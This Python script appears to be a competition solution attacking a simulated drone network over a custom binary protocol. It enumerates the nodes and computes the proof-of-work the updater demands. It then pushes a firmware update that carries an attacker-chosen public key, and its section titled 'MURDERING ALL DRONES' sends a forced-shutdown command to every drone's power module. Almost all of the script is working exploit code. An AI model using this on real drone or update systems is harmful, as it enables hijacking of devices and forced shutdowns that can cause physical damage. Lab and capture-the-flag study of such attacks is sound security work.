#!/usr/bin/env python3
'''
1. Start up the test network with: docker-compose up
2. ./hello.py hello # this talks to test controller on port 9000
3. ./hello.py --port 9001 hello # this talks to the test drone on port 9000 which docker exposes on 9001
'''

import struct
import socket
import time
from pprint import pprint
import sys
from hashlib import sha256

### START OF MY CODE ###########################################################
################################################################################

# generate and send packets to solve the task
def run(host, port, v=False):
    print("\n" + "*" * 20, "CONNECTING", "*" * 20 + "\n")
    s = connect(host, port)

    # at this point we're connected
    terminal_type = 1
    my_name = 'terminal'

    # make peers request with message type == 1, not routed
    peers_frame = make_frame(make_command(terminal_type, my_name, 0, 1))
   

    print("\n" + "*" * 20, "GETTING NODE ADDRESSES", "*" * 20 + "\n")  
    print("SENDing PEERS:")
    s.send(peers_frame)

    print("RECVing PEERS...")
    pkt = s.receive()

    # parse out all peer names and addresses
    (flags, msg, unknown_zeros), rest = parse_pkt(pkt)
    peers = parse_peers(rest, True)

    nodes = {}

    # use addresses to send peer request to each node
    print("PEERS:", peers)
    for node in peers:
        print("\n" + "*" * 20, "UPDATING NODE %s"%(node[1]), "*" * 20 + "\n")  
        nodes[node[1]] = {}
        nodes[node[1]]['addr'] = node[0]

        peers_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 1, 1, 0x3, [node[0]]))    
        
        print("SENDing Second PEERS to node", node[1], ":")
        s.send(peers_frame)

        print("RECVing Second PEERS...")
        pkt = s.receive()
    
        (flags, msg, offset), rest = parse_routable_pkt(pkt)
        for module in parse_peers(rest, True):
            nodes[node[1]][module[1]] = module[0]
 
        updater_addr_path = [nodes[node[1]]['addr'], nodes[node[1]][b'updater']]

        print("UPDATER ADDR PATH:", updater_addr_path)
        bad_open_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 3, 1, 0x66666667, updater_addr_path, b'\x00' * 32))

        # retrieve pow information, parse, send good pow information
        print("SENDing bad pow OPEN to updater module")
        s.send(bad_open_frame)

        pow_fmt = '<BBHIQQQ'
        print("RECVing bad pow OPEN Response from %s..."%(node[1]))
        pkt = s.receive()
        (flags, msg, offset), rest = parse_routable_pkt(pkt)
        version, bits, pid, timestamp, high, low, counter = struct.unpack(pow_fmt, rest[32:])
        print("Pow Config:", version, bits, pid, timestamp, high, low, counter)
        nodes[node[1]]['pid'] = pid
        nodes[node[1]]['high'] = high
        nodes[node[1]]['low'] = low
        
        # generate proof of work and start update
        session = make_pow(version, bits, pid, high, low) 

        # start update of flightmonitor from version 1.1 to version 1.2
        modulename = b'flightmonitor'
        fromversion = b'1.1'
        toversion = b'1.2'
        contents = struct.pack('>B', len(modulename)) + modulename + struct.pack('>B', len(fromversion)) + fromversion + struct.pack('>B', len(toversion)) + toversion
        good_open_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 3, 1, 0x66666667, updater_addr_path, session + contents))
        print("Start Update")
        send_receive_print(s, good_open_frame)
        
        # send manifest.sig
        manifest_sig, size = get_file('../bundle/var/opt/updater/modules/flightmonitor/1.1/manifest.sig')
        manifest_sig_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session + manifest_sig))
        print("SENDing manifest.sig")
        send_receive_print(s, manifest_sig_frame)
        
        # send manifest.sig
        manifest, size = get_file('../bundle/var/opt/updater/modules/flightmonitor/1.1/manifest')
        contents = struct.pack('>I', size) + manifest
        manifest_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session + contents))
        print("SENDing manifest")
        send_receive_print(s, manifest_frame)

        # send blank
        blank_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session))
        print("SENDing blank")
        send_receive_print(s, blank_frame)

        # send flightmonitor
        modulename = b'flightmonitor'
        fm, size = get_file('../bundle/var/opt/updater/modules/flightmonitor/1.1/flightmonitor')
        contents = struct.pack('>IB', size, len(modulename)) + modulename + fm
        module_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session + contents))
        print("SENDing flightmonitor")
        send_receive_print(s, module_frame)
        
        # send blank
        blank_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session))
        print("SENDing blank")
        send_receive_print(s, blank_frame)

        # send key
        keyname = b'key.pub'
        key, size = get_file('key.pub')
        contents = struct.pack('>IB', size, len(keyname)) + keyname + key
        key_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session + contents))
        print("SENDing key.pub")
        send_receive_print(s, key_frame)
        
        # send blank
        blank_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session))
        print("SENDing blank")
        send_receive_print(s, blank_frame)
        
        # send blank
        blank_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, updater_addr_path, session))
        print("SENDing blank")
        send_receive_print(s, blank_frame)
        
        # send close
        close_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 5, 1, 0x66666667, updater_addr_path, session))
        print("SENDing CLOSE")
        send_receive_print(s, close_frame)
    
    print("\n" + "*" * 20, "MURDERING ALL DRONES", "*" * 20 + "\n")

    # build address dict
    power_addresses = []
    updater_addresses = []
    for node in nodes:
        power_addresses.append(nodes[node]['addr'])
        power_addresses.append(nodes[node][b'power'])
        updater_addresses.append(nodes[node]['addr'])
        updater_addresses.append(nodes[node][b'updater'])

    shutdown_frame = make_frame(make_command(terminal_type, my_name, 1 << 7, 4, 1, 0x66666667, power_addresses, b'\x00' * 32 + b'forced-shutdown'))
    print("SENDing SHUTDOWN to power modules")
    s.send(shutdown_frame)
    for node in nodes: 
        print("RECVing...")
        pkt = s.receive()
        (flags, msg, offset), rest = parse_routable_pkt(pkt)
        content = rest[32:]
        print("Content:", content)

def get_file(filename):
    with open(filename, 'rb') as f:
        contents = f.read()

    return contents, len(contents)

# to send a frame when you don't care about using the response
def send_receive_print(s, frame):
        s.send(frame)
        pkt = s.receive()
        (flags, msg, offset), rest = parse_routable_pkt(pkt)
        content = rest[32:]
        print("Received Content:", content)
    

# make a routable packet
def make_routable_pkt(flags, msg, index, code, addrs, content):
    # add source address to list of nodes
    #print(addrs)
    a = [0x0000, 0x0001] + addrs
    
    # flags, msg, offset, index, code, addr count, addrs
    routed_fmt = '>BBHBIB' + 'H' * len(a)

    return struct.pack(routed_fmt, flags, msg, 6 + (2 * len(a)), index, code, len(a), *a) + content

# send things other than HELLO messages
def make_command(nodetype, name, flag_type, msg_type, index=0, code=0, addrs=[], data=b''):
    name = name.encode('utf-8')
    name = name[:31]
    name = name + b'\x00' * (32 - len(name))
    flags = flag_type
    msg = msg_type
    zeros = 0
    bunknown = struct.pack('>H', 0)
    btype = struct.pack('>B', nodetype)

    # custom data
    if len(data) != 0:
        content = data
    # default example data
    else:
        content = bunknown + btype + name

    # is it a routable packet?
    if flag_type & 0x80 != 0:
        pkt = make_routable_pkt(flags, msg, index, code, addrs, content)
    else:
        pkt = make_pkt(flags, msg, zeros, content)
    return pkt

# parse a routable packet
def parse_routable_pkt(frame):
    # flags, msg, offset, index, code, addr count
    pkt_hdr_fmt = '>BBHBIB'

    flags, msg, offset, index, code, count = struct.unpack_from(pkt_hdr_fmt, frame)
    return (flags, msg, offset), frame[struct.calcsize(pkt_hdr_fmt) + (count * 2):]

    routed_fmt = '>BBHBiBHHHH'
    flags, msg, offset, path_index, code, count, a1, a2, a3, a4 = struct.unpack_from(routed_fmt, frame)
    print("flags:", flags)
    print("msg:", msg)
    print("offset:", offset)
    print("path_index:", path_index)
    print("code:", code)
    print("address count:", count)
    print("addresses:", a1, a2, a3, a4)

# extract peers from peers request
def parse_peers(rest, include_name=False):
    peers = []
    while len(rest) > 0:
        node = rest[:35]
        rest = rest[35:]
        address, nodetype, name = struct.unpack('>HB32s', node)
        name = name.rstrip(b'\x00')
        if include_name:
            peers.append((address, name))
        else:
            peers.append(address)
        print('PEER:', 'address:', hex(address), 'type:', nodetype, 'name:', name)
    return peers

def make_pow(version, bits, pid, high, low):
    # version bits salt_name timestamp salt_high salt_low counter
    pow_fmt_1 = '<BBH'
    pow_fmt_2 = '>I'
    pow_fmt_3 = '<QQQ'
    counter = 0
    t = int(time.time())

    while True:
        try_pow = struct.pack(pow_fmt_1, version, bits, pid) + struct.pack(pow_fmt_2, t) + struct.pack(pow_fmt_3, high, low, counter)
        m = sha256()
        m.update(try_pow)
        h = m.digest()
        init_counter = counter

        # see if leftmost bits are 0
        for i in range(0, bits):
            a = i & 7
            if (i < 1):
                a = -(-a & 7)

            b = i + 7
            if (-1 < i):
                b = i

            if ((h[b >> 3] & 1 << (7 - a & 0x1f)) != 0):
                counter += 1
                break

        if counter == init_counter:
            print("POW Generated:", h)
            break

    new_pow = struct.pack(pow_fmt_1, version, bits, pid) + struct.pack(pow_fmt_2, t) + struct.pack(pow_fmt_3, high, low, counter)

    return new_pow

################################################################################
### END OF MY CODE #############################################################

class MySocket:
    """demonstration class only
      - coded for clarity, not efficiency
    """

    def __init__(self, sock=None, host=None, port=None):
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if host is not None:
                if port is None:
                    port = 9000
                self.connect(host, port)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))

    def _send(self, msg):
        totalsent = 0
        while totalsent < len(msg):
            sent = self.sock.send(msg[totalsent:])
            if sent == 0:
                raise RuntimeError("socket connection broken")
            totalsent = totalsent + sent

    def send(self, msg):
        return self._send(msg)

    def receiven(self, n):
        chunks = []
        bytes_recd = 0
        while bytes_recd < n:
            chunk = self.sock.recv(min(n - bytes_recd, 2048))
            if chunk == b'':
                raise RuntimeError("socket connection broken")
            chunks.append(chunk)
            bytes_recd = bytes_recd + len(chunk)
        return b''.join(chunks)

    def receive(self):
        szbytes = self.receiven(2)
        sz = struct.unpack('>H', szbytes)[0]
        data = self.receiven(sz)
        return data

def parse_pkt(frame):
    pkt_hdr_fmt = '>BBH'
    flags, msg, zeros = struct.unpack_from(pkt_hdr_fmt, frame)
    return (flags, msg, zeros), frame[struct.calcsize(pkt_hdr_fmt):]

def make_pkt(flags, msg, zeros, content):
    pkt_hdr_fmt = '>BBH'
    return struct.pack(pkt_hdr_fmt, flags, msg, zeros) + content

def make_hello(nodetype, name):
    name = name.encode('utf-8')
    name = name[:31]
    name = name + b'\x00' * (32 - len(name))
    flags = 0
    msg = 0
    zeros = 0
    bunknown = struct.pack('>H', 0)
    btype = struct.pack('>B', nodetype)
    content = bunknown + btype + name
    pkt = make_pkt(flags, msg, zeros, content)
    return pkt

def make_frame(pkt):
    # frames have a 16 bit big-endian length followed by packet content
    frame = struct.pack('>H', len(pkt)) + pkt
    return frame

def chunker(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))

def connect(host, port):
    s = MySocket(host=host, port=port)

    my_name = 'terminal'
    terminal_type = 1
    frame = make_frame(make_hello(terminal_type, my_name))

    print("SENDing HELLO:")
    s.send(frame)

    print("RECVing HELLO...")
    pkt = s.receive()

    (flags, msg, unknown_zeros), rest = parse_pkt(pkt)
    assert flags == 1
    assert msg == 0
    assert len(rest) == 35
    # nodetype seems to correspond to the the first argument to "router"
    unknown_maybe_random, nodetype, name = struct.unpack('>HB32s', rest)
    name = name.rstrip(b'\x00')
    print('connected to:', unknown_maybe_random, nodetype, name)
    return s

def send_packet(filename, host, port, v=False):
    s = connect(host, port)
    with open(filename, 'rb') as fobj:
        packet_data = fobj.read(0xFFFF) # 0xFFFF maximum frame size
    s.send(make_frame(packet_data))
    pkt = s.receive()
    (flags, msg, unknown_zeros), rest = parse_pkt(pkt)
    # TODO... do something with response


import argparse
# create the top-level parser
parser = argparse.ArgumentParser(prog='terminal')
parser.add_argument('-v', action='store_true', help='verbose')
parser.add_argument('--host', type=str, default='127.0.0.1', help='hostname')
parser.add_argument('--port', type=int, default=9000, help='port')
subparsers = parser.add_subparsers(help='sub-command help', required=True)

# create the parser for the "hello" command
parser_hello = subparsers.add_parser('hello', help='hello help')
parser_hello.set_defaults(func=run)

# create the parser for the "send" command
parser_send = subparsers.add_parser('send_packet', help='send_packet help')
parser_send.add_argument('filename', type=str, help='filename, contents to be sent verbatim after connect+HELLO')
parser_send.set_defaults(func=send_packet)

def main(argv=None):
    import sys
    if argv is None:
        argv = sys.argv
    if len(argv) < 2:
        argv = ['', '-h']
    args = parser.parse_args(argv[1:])
    args.func(**{k: v
                 for k, v in vars(args).items()
                 if k != 'func'})

if __name__ == '__main__':
    main()
